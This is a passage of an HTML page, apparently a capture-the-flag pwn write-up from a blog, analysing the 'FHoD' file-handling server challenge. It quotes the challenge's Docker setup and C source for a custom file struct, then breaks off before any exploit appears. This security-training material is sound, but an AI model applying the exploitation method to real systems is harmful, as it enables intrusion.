@@ -1,0 +1,1256 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/">
+      
+      
+        <link rel="next" href="../House%20of%20Nadeem/">
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.45">
+    
+    
+      
+        <title>FHoD - Kernelcide Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#analysis" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Kernelcide Blog" class="md-header__button md-logo" aria-label="Kernelcide Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Kernelcide Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              FHoD
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Kernelcide Blog" class="md-nav__button md-logo" aria-label="Kernelcide Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Kernelcide Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kernelcide
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    PCC Finals 2024
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            PCC Finals 2024
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Pwn%20Writeups%20-%20ShowDown%20%26%20CTF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pwn Writeups   ShowDown & CTF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    FHoD
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    FHoD
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Final Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#running-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Running the Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../House%20of%20Nadeem/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    House of Nadeem
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../The%20Zoo/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    The Zoo
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ShowDown
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            ShowDown
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ShowDown/Finals%20-%20Entity%20Encoder/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Finals   Entity Encoder
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ShowDown/Round%201%20-%20loadme/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Round 1   loadme
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ShowDown/Round%202%20-%20plusplus/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Round 2   plusplus
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ShowDown/Semi%20Finals%20-%20Jack%20Sparrow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Semi Finals   Jack Sparrow
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Blog
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blog
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Archive
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Final Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Final Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#running-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Running the Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>FHoD</h1>
+
+<p>The first PWN challenge we faced was titled "File Handling on Demand". The description stated that it was a custom file handling server but that it had been tested thoroughly and shouldn't have any bugs.  </p>
+<h2 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h2>
+<p>A zip file was provided with the following contents<br />
+<img alt="Pasted image 20241120234631.png" src="../../../images/Pasted%20image%2020241120234631.png" /></p>
+<p>The Dockerfile and docker-compose showed a pretty standard challenge setup 
+<div class="language-yaml highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">docker-compose.yml</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span>
+<span class="normal"><a href="#__codelineno-0-4">4</a></span>
+<span class="normal"><a href="#__codelineno-0-5">5</a></span>
+<span class="normal"><a href="#__codelineno-0-6">6</a></span>
+<span class="normal"><a href="#__codelineno-0-7">7</a></span>
+<span class="normal"><a href="#__codelineno-0-8">8</a></span>
+<span class="normal"><a href="#__codelineno-0-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3.9&#39;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="nt">services</span><span class="p">:</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="w">  </span><span class="nt">fhod</span><span class="p">:</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">    </span><span class="nt">build</span><span class="p">:</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="w">      </span><span class="nt">dockerfile</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./Dockerfile.dist</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="w">      </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">31337:8000</span>
+</span></code></pre></div></td></tr></table></div></p>
+<div class="language-dockerfile highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Dockerfile.dist</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span>
+<span class="normal"><a href="#__codelineno-1-5">5</a></span>
+<span class="normal"><a href="#__codelineno-1-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="k">FROM</span><span class="w"> </span><span class="s">theflash2k/pwn-chal:latest</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="k">ENV</span><span class="w"> </span><span class="nv">CHAL_NAME</span><span class="o">=</span>fhod
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="k">COPY</span><span class="w"> </span><span class="si">${</span><span class="nv">CHAL_NAME</span><span class="si">}</span><span class="w"> </span>.
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="k">COPY</span><span class="w"> </span>flag.txt<span class="w"> </span>.
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="k">RUN</span><span class="w"> </span>mv<span class="w"> </span>flag.txt<span class="w"> </span>flag-<span class="sb">`</span>cat<span class="w"> </span>/dev/urandom<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-10<span class="w"> </span><span class="p">|</span><span class="w"> </span>md5sum<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39; &#39;</span><span class="w"> </span>-f1<span class="sb">`</span>.txt
+</span></code></pre></div></td></tr></table></div>
+<p>The challenge binary notably had everything enabled except for PIE
+<img alt="Pasted image 20241120235338.png" src="../../../images/Pasted%20image%2020241120235338.png" /></p>
+<p>Source code was provided and looking through it we can see a few things  </p>
+<p>There is a custom file struct <code>_CUSTOM_IO_FILE_</code> that encapsulates the usual <code>FILE *</code> 
+<div class="language-c highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="cp">#define MAX_CONTENT_SIZE 0x100</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_CUSTOM_IO_FILE_</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">file</span><span class="p">;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">content</span><span class="p">[</span><span class="n">MAX_CONTENT_SIZE</span><span class="p">];</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="n">is_open</span><span class="p">;</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="n">_IO_MODE_</span><span class="w"> </span><span class="n">mode</span><span class="p">;</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="p">}</span><span class="w"> </span><span class="n">_CUSTOM_IO_FILE_</span><span class="p">;</span>
+</span></code></pre></div></p>
+<p>Objects can be initialized in the following function
+<div class="language-c highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">_CUSTOM_IO_FILE_</span><span class="o">*</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nf">_init_IO</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="n">_CUSTOM_IO_FILE_</span><span class="o">*</span><span class="w"> </span><span class="n">io</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">_CUSTOM_IO_FILE_</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">_CUSTOM_IO_FILE_</span><span class="p">));</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="n">io</span><span class="o">-&gt;</span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="n">io</span><span class="o">-&gt;</span><span class="n">is_open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">io</span><span class="p">;</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="p">}</span>
+</span></code></pre></div></p>
+<p><code>_init_IO()</code> is called at the start of the program once and the <code>_CUSTOM_IO_FILE_*</code> that is returned is used for all subsequent operations  </p>
+<p>The following operations are defined for <code>_CUSTOM_IO_FILE_</code>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">typedef</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">_IO_MODE_</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span><span class="n">_IO_OPEN_</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0</span><span class="p">,</span><span class="w"> </span><span class="c1">// Opening file using fopen</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span><span class="n">_IO_READ_</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1</span><span class="p">,</span><span class="w"> </span><span class="c1">// Reading from file using fread</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span><span class="n">_IO_WRITE_</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2</span><span class="p">,</span><span class="w"> </span><span class="c1">// Writing to file using fwrite</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">    </span><span class="n">_IO_CLOSE_</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="mh">0x3</span><span class="p">,</span><span class="w"> </span><span class="c1">// Closing file using fclose</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">    </span><span class="n">_IO_MODIFY_</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="mh">0x4</span><span class="w">  </span><span class="c1">// Modify the contents of the file.</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="p">}</span><span class="w"> </span><span class="n">_IO_MODE_</span><span class="p">;</span>
+</span></code></pre></div></p>
+<p>Before each operation, an <code>_IO_precheck</code> function is called to check whether the operation can be safely performed on the file
+<div class="language-c highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">_IO_ERROR_</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nf">_IO_precheck_</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="n">_CUSTOM_IO_FILE_</span><span class="w"> </span><span class="o">*</span><span class="n">io</span><span class="p">,</span><span class="w"> </span><span class="n">_IO_MODE_</span><span class="w"> </span><span class="n">MODE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
